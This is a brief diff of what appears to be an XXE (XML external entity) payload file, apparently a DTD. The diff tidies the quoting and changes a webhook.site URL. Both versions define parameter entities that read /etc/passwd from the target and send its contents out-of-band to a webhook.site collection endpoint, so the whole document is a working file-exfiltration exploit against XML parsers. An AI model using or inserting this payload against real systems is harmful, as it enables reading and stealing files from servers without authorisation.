@@ -1,3 +1,2 @@
-<!ENTITY % payload SYSTEM “file:///etc/passwd”>
-
-<!ENTITY % param1 ‘<!ENTITY % external SYSTEM “http://webhook.site/7c73792d-05bb-48ae-ae3c-548a92e8b262?%payload;”>’> %param1; %external;
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 '<!ENTITY % external SYSTEM "http://webhook.site/#/7c73792d-05bb-48ae-ae3c-548a92e8b262?%payload;">'> %param1; %external;
